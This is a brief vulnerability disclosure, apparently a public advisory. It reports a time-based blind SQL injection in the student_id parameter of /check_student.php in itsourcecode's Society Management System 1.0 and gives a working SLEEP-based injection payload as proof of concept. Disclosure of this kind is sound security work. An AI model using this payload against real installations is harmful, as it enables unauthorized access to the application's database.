# Vendor

itsourcecode

# Product

Society Management System

# version

1.0

Download Source Code: https://itsourcecode.com/wp-content/uploads/2021/04/Society-Management-System-Project-In-PHP-Free-Download-Source-Code.zip

# Description

There is an SQL injection vulnerability on the /check_student.php page.
<img width="1100" alt="image" src="https://github.com/user-attachments/assets/f6d49d3e-5598-4772-95d5-2e1b305a079f">


# Poc
```
Parameter: student_id (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: student_id=12345678' AND (SELECT 2119 FROM (SELECT(SLEEP(5)))fURM) AND 'Njoa'='Njoa
```
